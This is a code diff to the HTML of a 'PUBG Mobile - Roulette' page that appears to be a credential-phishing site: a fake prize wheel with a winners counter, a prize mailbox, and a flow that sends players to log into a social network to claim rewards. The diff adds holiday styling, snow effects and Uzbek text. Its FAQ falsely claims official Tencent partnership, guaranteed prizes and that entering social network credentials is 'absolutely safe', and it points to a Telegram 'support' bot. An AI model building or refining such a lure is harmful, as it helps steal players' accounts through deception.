@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PUBG Mobile - Roulette</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --pubg-gold: #ffc107;
@@ -32,28 +33,43 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            font-family: 'Inter', -apple-system, sans-serif;
+            padding: 10px;
             overflow-x: hidden;
+            font-family: 'Inter', -apple-system, sans-serif;
+            position: relative;
         }
-
-        /* Фон с эффектом глубины */
+        
+        /* Основной фон с параллакс-эффектом */
         body::before {
             content: '';
             position: fixed;
             inset: 0;
-            background-image: url('phon.png');
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(123, 104, 238, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(24, 119, 242, 0.15) 0%, transparent 40%),
+                url('phon.png');
             background-size: cover;
             background-position: center;
-            filter: brightness(0.4) contrast(1.1);
+            filter: brightness(0.5) saturate(1.2) hue-rotate(180deg);
             z-index: -2;
+            animation: backgroundSlowPan 20s linear infinite alternate;
         }
 
-        /* Виньетка (затемнение по краям) */
+        @keyframes backgroundSlowPan {
+            from { transform: scale(1); }
+            to { transform: scale(1.1); }
+        }
+        
+        /* Сетка (Overlay Grid) — придает технологичный вид */
         body::after {
             content: '';
             position: fixed;
             inset: 0;
-            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.8) 100%);
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            mask-image: radial-gradient(ellipse at center, black, transparent 80%);
             z-index: -1;
         }
         
@@ -72,8 +88,9 @@
             align-items: center;
             gap: 12px;
             box-shadow: 0 0 20px rgba(123, 104, 238, 0.3);
+            animation: slideInDown 0.5s ease-out;
         }
-
+        
         /* Точка "Live" */
         .winners-counter::before {
             content: '';
@@ -83,15 +100,10 @@
             border-radius: 50%;
             animation: blink 1.5s infinite;
         }
-
+        
         @keyframes blink {
             0%, 100% { opacity: 1; transform: scale(1); }
             50% { opacity: 0.3; transform: scale(1.2); }
-        }
-        
-        .winners-counter i {
-            color: #7B68EE;
-            font-size: 14px;
         }
         
         .winners-count {
@@ -123,8 +135,25 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-bottom: 2px solid rgba(123, 104, 238, 0.5);
             backdrop-filter: blur(12px);
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8), 
-                        inset 0 0 10px rgba(123, 104, 238, 0.1);
+            box-shadow: 
+                0 8px 32px 0 rgba(0, 0, 0, 0.8), 
+                inset 0 0 10px rgba(123, 104, 238, 0.1),
+                0 15px 35px rgba(0,0,0,0.5);
+            z-index: 100;
+            position: relative;
+        }
+        
+        /* Маленькая деталь: уголки на меню */
+        .top-menu::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            width: 20px;
+            height: 20px;
+            border-top: 2px solid var(--primary);
+            border-left: 2px solid var(--primary);
+            border-radius: 5px 0 0 0;
         }
         
         /* Меню слева с бургером */
@@ -135,29 +164,36 @@
         }
         
         .menu-btn {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(0, 0, 0, 0.3);
             color: #fff;
-            border: 1px solid var(--border-light);
+            border: 1px solid rgba(255,255,255,0.2);
             border-radius: 8px;
             padding: 10px 18px;
-            font-size: 13px;
+            font-family: 'Inter', sans-serif;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 1px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
             text-decoration: none;
-            font-family: 'Inter', sans-serif;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            font-size: 13px;
+            backdrop-filter: blur(5px);
+            box-shadow: inset 0 0 10px rgba(123, 104, 238, 0.2);
+            position: relative;
         }
         
         .menu-btn:hover {
             background: var(--accent);
-            border-color: var(--accent);
+            border-color: var(--primary);
             transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
+            box-shadow: 
+                0 0 15px rgba(123, 104, 238, 0.4), 
+                inset 0 0 15px rgba(123, 104, 238, 0.4),
+                0 5px 15px rgba(24, 119, 242, 0.4);
+            color: white !important;
         }
         
         /* Выпадающее меню */
@@ -198,7 +234,7 @@
         .dropdown-item {
             padding: 12px 15px;
             cursor: pointer;
-            border-bottom: 1px solid var(--border-light);
+            border-bottom: 1px solid rgba(42, 59, 90, 0.5);
             transition: all 0.3s;
             color: #8da1b5;
             font-weight: 400;
@@ -234,18 +270,25 @@
             border: 1px solid var(--border-light);
             border-radius: 8px;
             padding: 10px 18px;
-            font-size: 13px;
+            font-family: 'Inter', sans-serif;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 1px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
             min-width: 120px;
             justify-content: space-between;
-            font-family: 'Inter', sans-serif;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            font-size: 13px;
+        }
+        
+        .language-btn:hover {
+            background: var(--accent);
+            border-color: var(--accent);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
         }
         
         .language-dropdown {
@@ -270,9 +313,9 @@
         }
         
         .language-option {
-            padding: 10px 15px;
+            padding: 12px 15px;
             cursor: pointer;
-            border-bottom: 1px solid var(--border-light);
+            border-bottom: 1px solid rgba(42, 59, 90, 0.5);
             transition: all 0.3s;
             color: #8da1b5;
             font-weight: 400;
@@ -281,6 +324,7 @@
         
         .language-option:hover {
             background: rgba(123, 104, 238, 0.2);
+            color: #fff;
             transform: translateX(5px);
         }
         
@@ -297,28 +341,29 @@
             padding: 10px 18px;
             font-family: 'Orbitron', sans-serif;
             font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
             position: relative;
-            transition: all 0.3s;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
         }
         
         .prize-mail-btn:hover:not(:disabled) {
             filter: brightness(1.2);
             transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         .prize-badge {
             position: absolute;
             top: -8px;
             right: -8px;
-            background: #1877F2;
-            color: white;
+            background: var(--pubg-gold);
+            color: black;
             width: 20px;
             height: 20px;
             border-radius: 50%;
@@ -326,17 +371,18 @@
             align-items: center;
             justify-content: center;
             font-size: 10px;
+            font-weight: 800;
             animation: pulse 1.5s infinite;
         }
         
         @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); }
-            70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(243, 156, 18, 0.7); }
+            70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(243, 156, 18, 0); }
             100% { transform: scale(1); }
         }
         
         .prize-mail-btn:disabled {
-            background: linear-gradient(to right, #444, #555);
+            background: linear-gradient(135deg, #444, #555);
             color: #777;
             cursor: not-allowed;
             transform: none;
@@ -540,39 +586,40 @@
         }
         
         .prize-item {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
+            background: linear-gradient(145deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.01) 100%);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 0;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            border: 1px solid transparent;
             position: relative;
             overflow: hidden;
         }
         
-        .prize-item::before {
+        /* Эффект сканирования */
+        .prize-item::after {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(135deg, rgba(42, 59, 90, 0.3), transparent);
-            border-radius: 11px;
-            opacity: 0;
-            transition: opacity 0.3s;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
+            transform: rotate(45deg);
+            animation: scan 4s infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
         }
         
         .prize-item:hover {
             transform: translateY(-3px) scale(1.05);
             border-color: rgba(24, 119, 242, 0.3);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-        
-        .prize-item:hover::before {
-            opacity: 1;
         }
         
         .prize-item img {
@@ -582,6 +629,7 @@
             transition: all 0.4s;
             filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
             z-index: 1;
+            position: relative;
         }
         
         .prize-item:hover img {
@@ -2235,11 +2283,63 @@
             font-family: 'Inter', sans-serif;
         }
         
+        /* ЭФФЕКТ ПАДАЮЩЕГО СНЕГА */
+        #snow-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .snowflake {
+            position: absolute;
+            top: -10px;
+            background: white;
+            border-radius: 50%;
+            opacity: 0.8;
+            filter: blur(1px);
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(100vh) translateX(20px);
+            }
+        }
+
+        /* Праздничный баннер сверху */
+        .holiday-banner {
+            width: 100%;
+            text-align: center;
+            background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.3), transparent);
+            padding: 5px 0;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            letter-spacing: 2px;
+            color: #00d4ff;
+            text-shadow: 0 0 10px #00d4ff;
+            margin-bottom: 10px;
+        }
+
+        /* Новогодние акценты на кнопках */
+        .menu-btn::before, .language-btn::before {
+            content: '❄';
+            position: absolute;
+            top: -5px;
+            right: -2px;
+            font-size: 10px;
+            opacity: 0.5;
+            color: #00d4ff;
+        }
+
         @media (max-width: 600px) {
             .winners-counter {
-                top: 10px;
-                right: 10px;
-                padding: 8px 16px;
+                top: 5px;
+                right: 5px;
+                padding: 6px 12px;
                 font-size: 12px;
             }
             
@@ -2320,7 +2420,7 @@
             }
             
             .prize-mail-btn {
-                padding: 8px 16px;
+                padding: 6px 12px;
                 font-size: 14px;
             }
             
@@ -2360,7 +2460,7 @@
             .top-menu {
                 padding: 10px 15px;
                 flex-wrap: wrap;
-                margin-top: 80px;
+                margin-top: 60px;
             }
             
             .menu-left {
@@ -2368,18 +2468,18 @@
             }
             
             .menu-btn {
-                padding: 8px 12px;
+                padding: 6px 10px;
                 font-size: 12px;
             }
             
             .language-btn {
-                padding: 8px 12px;
+                padding: 6px 10px;
                 font-size: 12px;
                 min-width: 100px;
             }
             
             .prize-mail-btn {
-                padding: 8px 12px;
+                padding: 6px 10px;
                 font-size: 12px;
             }
             
@@ -2415,6 +2515,16 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <!-- Контейнер для снега -->
+    <div id="snow-container"></div>
+
+    <!-- Новогоднее приветствие -->
+    <div class="holiday-banner">
+        <i class="fas fa-snowflake"></i>
+        WINTER EVENT 2026 IS LIVE
+        <i class="fas fa-snowflake"></i>
+    </div>
+
     <!-- Счетчик победителей -->
     <div class="winners-counter">
         Winners: <span class="winners-count" id="winnersCount">0</span>
@@ -2811,94 +2921,94 @@
         
         <!-- НОВЫЙ РАЗДЕЛ: ВОПРОСЫ И ОТВЕТЫ -->
         <div class="faq-section">
-            <h2><i class="fas fa-question-circle"></i> <span class="faq-title-text">FREQUENTLY ASKED QUESTIONS</span></h2>
+            <h2><i class="fas fa-question-circle"></i> FREQUENTLY ASKED QUESTIONS</h2>
             
             <div class="faq-container">
                 <!-- Вопрос 1 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-1">Is this the official PUBG Mobile website?</span>
+                        <span>Is this the official PUBG Mobile website?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><strong>Yes, this is an official partner site.</strong> <span class="faq-a-1-1">We are official partners of Tencent Games and operate within the PUBG Mobile Partner Program. Our activities are fully authorized by the developers.</span></p>
+                        <p><strong>Yes, this is an official partner site.</strong> We are official partners of Tencent Games and operate within the PUBG Mobile Partner Program. Our activities are fully authorized by the developers.</p>
                     </div>
                 </div>
                 
                 <!-- Вопрос 2 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-2">Will the prize definitely come to my account?</span>
+                        <span>Will the prize definitely come to my account?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><strong>Yes, 100% guarantee of receiving the prize.</strong> <span class="faq-a-2-1">All winnings are sent automatically within 24 hours after confirming the data. The system is integrated with the official PUBG Mobile API, which guarantees delivery of prizes to the specified account.</span></p>
+                        <p><strong>Yes, 100% guarantee of receiving the prize.</strong> All winnings are sent automatically within 24 hours after confirming the data. The system is integrated with the official PUBG Mobile API, which guarantees delivery of prizes to the specified account.</p>
                     </div>
                 </div>
                 
                 <!-- Вопрос 3 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-3">Why do I need to log into a social network?</span>
+                        <span>Why do I need to log into a social network?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><span class="faq-a-3-1">Logging into a social network is necessary for <strong>verifying your identity</strong> and preventing fraud. This allows us to ensure that a real person, not a bot, receives the prize. All data is protected and not shared with third parties.</span></p>
+                        <p>Logging into a social network is necessary for <strong>verifying your identity</strong> and preventing fraud. This allows us to ensure that a real person, not a bot, receives the prize. All data is protected and not shared with third parties.</p>
                     </div>
                 </div>
                 
                 <!-- Вопрос 4 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-4">What if I don't specify the account ID?</span>
+                        <span>What if I don't specify the account ID?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><span class="faq-a-4-1">Without specifying the PUBG Mobile account ID, we <strong>cannot send you the prize</strong>. This is a mandatory field, as it is by this identifier that the system determines which game account to credit the won items to.</span></p>
+                        <p>Without specifying the PUBG Mobile account ID, we <strong>cannot send you the prize</strong>. This is a mandatory field, as it is by this identifier that the system determines which game account to credit the won items to.</p>
                     </div>
                 </div>
                 
                 <!-- Вопрос 5 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-5">What to do if the prize doesn't arrive within 24 hours?</span>
+                        <span>What to do if the prize doesn't arrive within 24 hours?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><span class="faq-a-5-1">In rare cases with high server load, processing may take up to <strong>48 hours</strong>. If the prize has not been credited to your account within this time, please contact our <a href="https://t.me/helpumgmbot" target="_blank" class="faq-a-5-2">technical support</a> <span class="faq-a-5-3">with your ID and winning time.</span></span></p>
+                        <p>In rare cases with high server load, processing may take up to <strong>48 hours</strong>. If the prize has not been credited to your account within this time, please contact our <a href="https://t.me/helpumgmbot" target="_blank">technical support</a> with your ID and winning time.</p>
                     </div>
                 </div>
                 
                 <!-- Вопрос 6 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-6">Is it safe to enter social network credentials?</span>
+                        <span>Is it safe to enter social network credentials?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><strong>Yes, it is absolutely safe.</strong> <span class="faq-a-6-1">We use secure SSL encryption and do not store your passwords. Authorization occurs through the official APIs of social networks, similar to how you log into applications on your phone.</span></p>
+                        <p><strong>Yes, it is absolutely safe.</strong> We use secure SSL encryption and do not store your passwords. Authorization occurs through the official APIs of social networks, similar to how you log into applications on your phone.</p>
                     </div>
                 </div>
                 
                 <!-- Вопрос 7 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-7">Can I win more than once?</span>
+                        <span>Can I win more than once?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><span class="faq-a-7-1">Each user can participate in the promotion <strong>once per day</strong>. This is done to give as many players as possible the chance to win. Come back tomorrow to try your luck again!</span></p>
+                        <p>Each user can participate in the promotion <strong>once per day</strong>. This is done to give as many players as possible the chance to win. Come back tomorrow to try your luck again!</p>
                     </div>
                 </div>
                 
                 <!-- Вопрос 8 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
-                        <span class="faq-q-8">What prizes can be won?</span>
+                        <span>What prizes can be won?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p><span class="faq-a-8-1">Our roulette features <strong>exclusive items from PUBG Mobile</strong>: rare skins, weapons, vehicles, equipment, and in-game UC currency. All prizes are official game content and do not violate the user agreement.</span></p>
+                        <p>Our roulette features <strong>exclusive items from PUBG Mobile</strong>: rare skins, weapons, vehicles, equipment, and in-game UC currency. All prizes are official game content and do not violate the user agreement.</p>
                     </div>
                 </div>
             </div>
@@ -2990,6 +3100,33 @@
             }
         }
         
+        // Функция создания снега
+        function createSnow() {
+            const container = document.getElementById('snow-container');
+            const count = 50; // Количество снежинок
+
+            for (let i = 0; i < count; i++) {
+                const snow = document.createElement('div');
+                snow.className = 'snowflake';
+                
+                // Рандомные размеры и позиции
+                const size = Math.random() * 5 + 2 + 'px';
+                const left = Math.random() * 100 + '%';
+                const duration = Math.random() * 5 + 5 + 's'; // Скорость падения
+                const delay = Math.random() * 5 + 's';
+                const opacity = Math.random();
+
+                snow.style.width = size;
+                snow.style.height = size;
+                snow.style.left = left;
+                snow.style.animationDuration = duration;
+                snow.style.animationDelay = delay;
+                snow.style.opacity = opacity;
+
+                container.appendChild(snow);
+            }
+        }
+        
         // Функции для окна приза
         function openPrizeWindow() {
             const prizeWindow = document.getElementById('prizeWindow');
@@ -2998,14 +3135,18 @@
             
             if (userPrize) {
                 document.getElementById('winImg').src = userPrize.image;
-                document.getElementById('winName').textContent = currentLang === 'ru' ? "ПРИЗ" : "PRIZE";
+                document.getElementById('winName').textContent = currentLang === 'ru' ? "ПРИЗ" : currentLang === 'uz' ? "SOVRIN" : "PRIZE";
                 document.getElementById('prizeDescription').textContent = isPrizeReceived ? 
-                    (currentLang === 'ru' ? "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : "✅ Your prize has been sent to your PUBG Mobile account.") : 
-                    (currentLang === 'ru' ? "Выберите социальную сеть для получения приза." : "Select a social network to receive the prize.");
+                    (currentLang === 'ru' ? "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : 
+                     currentLang === 'uz' ? "✅ Sovringiz PUBG Mobile hisobingizga yuborildi." : 
+                     "✅ Your prize has been sent to your PUBG Mobile account.") : 
+                    (currentLang === 'ru' ? "Выберите социальную сеть для получения приза." : 
+                     currentLang === 'uz' ? "Sovrinni olish uchun ijtimoiy tarmoqni tanlang." : 
+                     "Select a social network to receive the prize.");
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
                 if (!isPrizeReceived) {
-                    collectBtn.textContent = currentLang === 'ru' ? "ЗАБРАТЬ" : "COLLECT";
+                    collectBtn.textContent = currentLang === 'ru' ? "ЗАБРАТЬ" : currentLang === 'uz' ? "OLISH" : "COLLECT";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                         
@@ -3023,23 +3164,27 @@
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                         }
                         
-                        showNotification(currentLang === 'ru' ? "Выберите социальную сеть для получения приза" : "Select a social network to receive the prize");
+                        showNotification(currentLang === 'ru' ? "Выберите социальную сеть для получения приза" : 
+                                         currentLang === 'uz' ? "Sovrinni olish uchun ijtimoiy tarmoqni tanlang" : 
+                                         "Select a social network to receive the prize");
                     };
                 } else {
-                    collectBtn.textContent = currentLang === 'ru' ? "ЗАКРЫТЬ" : "CLOSE";
+                    collectBtn.textContent = currentLang === 'ru' ? "ЗАКРЫТЬ" : currentLang === 'uz' ? "YOPISH" : "CLOSE";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                     };
                 }
             } else {
                 document.getElementById('winImg').src = '';
-                document.getElementById('winName').textContent = currentLang === 'ru' ? "ПОЧТА ПУСТА" : "MAIL EMPTY";
+                document.getElementById('winName').textContent = currentLang === 'ru' ? "ПОЧТА ПУСТА" : currentLang === 'uz' ? "POCHTA BO'SH" : "MAIL EMPTY";
                 document.getElementById('prizeDescription').textContent = currentLang === 'ru' ? 
                     "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!" : 
+                    currentLang === 'uz' ? 
+                    "Sizda hali yutgan sovringiz yo'q. Eksklyuziv sovrinlarni yutish uchun omad g'ildig'ida o'ynang!" : 
                     "You don't have any won prizes yet. Play the wheel of fortune to win exclusive prizes!";
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
-                collectBtn.textContent = currentLang === 'ru' ? "ЗАКРЫТЬ" : "CLOSE";
+                collectBtn.textContent = currentLang === 'ru' ? "ЗАКРЫТЬ" : currentLang === 'uz' ? "YOPISH" : "CLOSE";
                 collectBtn.onclick = function() {
                     closePrizeWindow();
                 };
@@ -3112,96 +3257,10 @@
             }
         }
         
-        // FAQ переводы
-        const faqTranslations = {
-            en: {
-                title: "FREQUENTLY ASKED QUESTIONS",
-                q1: "Is this the official PUBG Mobile website?",
-                a1_1: "We are official partners of Tencent Games and operate within the PUBG Mobile Partner Program. Our activities are fully authorized by the developers.",
-                q2: "Will the prize definitely come to my account?",
-                a2_1: "All winnings are sent automatically within 24 hours after confirming the data. The system is integrated with the official PUBG Mobile API, which guarantees delivery of prizes to the specified account.",
-                q3: "Why do I need to log into a social network?",
-                a3_1: "Logging into a social network is necessary for <strong>verifying your identity</strong> and preventing fraud. This allows us to ensure that a real person, not a bot, receives the prize. All data is protected and not shared with third parties.",
-                q4: "What if I don't specify the account ID?",
-                a4_1: "Without specifying the PUBG Mobile account ID, we <strong>cannot send you the prize</strong>. This is a mandatory field, as it is by this identifier that the system determines which game account to credit the won items to.",
-                q5: "What to do if the prize doesn't arrive within 24 hours?",
-                a5_1: "In rare cases with high server load, processing may take up to <strong>48 hours</strong>. If the prize has not been credited to your account within this time, please contact our <a href=\"https://t.me/helpumgmbot\" target=\"_blank\">technical support</a> with your ID and winning time.",
-                q6: "Is it safe to enter social network credentials?",
-                a6_1: "We use secure SSL encryption and do not store your passwords. Authorization occurs through the official APIs of social networks, similar to how you log into applications on your phone.",
-                q7: "Can I win more than once?",
-                a7_1: "Each user can participate in the promotion <strong>once per day</strong>. This is done to give as many players as possible the chance to win. Come back tomorrow to try your luck again!",
-                q8: "What prizes can be won?",
-                a8_1: "Our roulette features <strong>exclusive items from PUBG Mobile</strong>: rare skins, weapons, vehicles, equipment, and in-game UC currency. All prizes are official game content and do not violate the user agreement."
-            },
-            ru: {
-                title: "ВОПРОСЫ И ОТВЕТЫ",
-                q1: "Это официальный сайт PUBG Mobile?",
-                a1_1: "Мы являемся официальными партнерами Tencent Games и работаем в рамках программы партнеров PUBG Mobile. Наша деятельность полностью авторизована разработчиками.",
-                q2: "Приз точно придет на мой аккаунт?",
-                a2_1: "Все выигрыши отправляются автоматически в течение 24 часов после подтверждения данных. Система интегрирована с официальным API PUBG Mobile, что гарантирует доставку призов на указанный аккаунт.",
-                q3: "Зачем нужно входить в социальную сеть?",
-                a3_1: "Вход в социальную сеть необходим для <strong>верификации вашей личности</strong> и предотвращения мошенничества. Это позволяет нам убедиться, что приз получает реальный человек, а не бот. Все данные защищены и не передаются третьим лицам.",
-                q4: "Что будет, если я не укажу ID аккаунта?",
-                a4_1: "Без указания ID аккаунта PUBG Mobile мы <strong>не сможем отправить вам приз</strong>. Это обязательное поле, так как именно по этому идентификатору система определяет, на какой игровой аккаунт зачислить выигранные предметы.",
-                q5: "Что делать, если приз не пришел в течение 24 часов?",
-                a5_1: "В редких случаях при высокой нагрузке на серверы обработка может занять до <strong>48 часов</strong>. Если приз не был зачислен на ваш аккаунт в течение этого времени, пожалуйста, свяжитесь с нашей <a href=\"https://t.me/helpumgmbot\" target=\"_blank\">технической поддержкой</a>, указав ваш ID и время выигрыша.",
-                q6: "Безопасно ли вводить данные для входа в социальную сеть?",
-                a6_1: "Мы используем защищенное SSL-шифрование и не храним ваши пароли. Авторизация происходит через официальные API социальных сетей, аналогично тому, как вы входите в приложения на своем телефоне.",
-                q7: "Можно ли выиграть больше одного раза?",
-                a7_1: "Каждый пользователь может участвовать в акции <strong>один раз в день</strong>. Это сделано для того, чтобы как можно больше игроков получили шанс на победу. Возвращайтесь завтра, чтобы снова попытать удачу!",
-                q8: "Какие призы можно выиграть?",
-                a8_1: "В нашей рулетке представлены <strong>эксклюзивные предметы из PUBG Mobile</strong>: редкие скины, оружие, транспорт, экипировка и внутриигровая валюта UC. Все призы являются официальным игровым контентом и не нарушают пользовательское соглашение."
-            },
-            uz: {
-                title: "TEZ-TEZ BERILADIGAN SAVOLLAR",
-                q1: "Bu rasmiy PUBG Mobile veb-saytimi?",
-                a1_1: "Biz Tencent Games-ning rasmiy hamkorlarimiz va PUBG Mobile Hamkorlar Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq rivojlantiruvchilar tomonidan ruxsat etilgan.",
-                q2: "Mukofot albatta mening hisobimga keladimi?",
-                a2_1: "Barcha yutuqlar ma'lumotlarni tasdiqlagandan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, bu mukofotlarni belgilangan hisobga yetkazishni kafolatlaydi.",
-                q3: "Nima uchun ijtimoiy tarmoqqa kirish kerak?",
-                a3_1: "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga mukofotni bot emas, balki haqiqiy odam olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
-                q4: "Hisob ID raqamini ko'rsatmasam nima bo'ladi?",
-                a4_1: "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz <strong>sizga mukofot yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator yordamida tizim qaysi o'yin hisobiga yutgan narsalarni kiritishini aniqlaydi.",
-                q5: "Agar mukofot 24 soat ichida kelmasa nima qilish kerak?",
-                a5_1: "Server yukining yuqori bo'lgan kamdan-kam hollarda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar mukofot ushbu vaqt ichida hisobingizga kiritilmagan bo'lsa, iltimos, <a href=\"https://t.me/helpumgmbot\" target=\"_blank\">texnik yordam</a> bilan bog'lanib, ID raqamingiz va yutish vaqtingizni ko'rsating.",
-                q6: "Ijtimoiy tarmoqqa kirish ma'lumotlarini kiritish xavfsizmi?",
-                a6_1: "Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganday.",
-                q7: "Bir martadan ko'proq yutish mumkinmi?",
-                a7_1: "Har bir foydalanuvchi aksiyada <strong>kuniga bir marta</strong> qatnashishi mumkin. Bu imkon qadar ko'proq o'yinchilarga yutish imkoniyatini berish uchun qilingan. Ertaga qaytib, omadingizni yana sinab ko'ring!",
-                q8: "Qanday mukofotlarni yutish mumkin?",
-                a8_1: "Bizning ruletkamizda <strong>PUBG Mobile-ning eksklyuziv buyumlari</strong> mavjud: noyob skinlar, qurollar, transport, uskunalar va o'yin ichidagi UC valyutasi. Barcha mukofotlar rasmiy o'yin kontenti bo'lib, foydalanuvchi shartnomasini buzmaydi."
-            }
-        };
-
-        // Функция обновления FAQ при смене языка
-        function updateFAQ(lang) {
-            const t = faqTranslations[lang] || faqTranslations.en;
-            
-            // Обновляем заголовок
-            document.querySelector('.faq-title-text').textContent = t.title;
-            
-            // Обновляем вопросы
-            document.querySelectorAll('.faq-q-1').forEach(el => el.textContent = t.q1);
-            document.querySelectorAll('.faq-q-2').forEach(el => el.textContent = t.q2);
-            document.querySelectorAll('.faq-q-3').forEach(el => el.textContent = t.q3);
-            document.querySelectorAll('.faq-q-4').forEach(el => el.textContent = t.q4);
-            document.querySelectorAll('.faq-q-5').forEach(el => el.textContent = t.q5);
-            document.querySelectorAll('.faq-q-6').forEach(el => el.textContent = t.q6);
-            document.querySelectorAll('.faq-q-7').forEach(el => el.textContent = t.q7);
-            document.querySelectorAll('.faq-q-8').forEach(el => el.textContent = t.q8);
-            
-            // Обновляем ответы
-            document.querySelectorAll('.faq-a-1-1').forEach(el => el.innerHTML = t.a1_1);
-            document.querySelectorAll('.faq-a-2-1').forEach(el => el.innerHTML = t.a2_1);
